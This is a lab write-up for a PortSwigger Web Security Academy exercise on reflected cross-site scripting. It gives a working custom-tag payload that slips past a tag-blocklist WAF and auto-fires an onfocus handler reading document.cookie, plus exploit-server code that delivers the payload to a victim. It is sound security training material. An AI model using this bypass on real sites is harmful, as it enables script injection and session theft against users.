# Lab 15: Reflected XSS into HTML context with all tags blocked except custom ones

**Category:** Cross-Site Scripting (XSS)  
**Difficulty:** Practitioner  
**Lab link:** [Reflected XSS into HTML context with all tags blocked except custom ones](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-all-standard-tags-blocked)

## Overview

The search functionality reflects input into HTML context, but a WAF blocks every standard HTML tag. Custom (unknown) tags pass through because the WAF only blocklists known tag names. Browsers still attach event handlers to custom elements.

## Key Concepts

- **Custom tag bypass:** `<xss>`, `<anything>` — the WAF doesn't recognize them so they pass; the browser renders them as generic DOM elements that support event handlers
- **Auto-focus trick:** `tabindex=1` makes a custom element focusable, `onfocus` fires on focus, and `#id` fragment in the URL makes the browser auto-focus that element on load
- **`location =` redirect:** Better than iframes when the URL fragment (`#x`) needs to trigger behavior in the top-level browsing context

## Solution

1. Confirm custom tags pass the WAF: search for `<xss>` — returns 200
2. Go to exploit server, set body to:

```html
<script>
location = 'https://LAB-ID.web-security-academy.net/?search=<xss id=x onfocus=alert(document.cookie) tabindex=1>#x';
</script>
```

3. Store → Deliver to victim

## Payload Breakdown

```html
<xss id=x onfocus=alert(document.cookie) tabindex=1>
```

- `<xss>` — custom tag, bypasses the tag blocklist
- `id=x` — gives the element an anchor target
- `tabindex=1` — makes the custom element focusable
- `onfocus=alert(document.cookie)` — fires when the element receives focus
- `#x` in the URL — browser scrolls to and focuses the element with `id=x`, auto-triggering `onfocus`
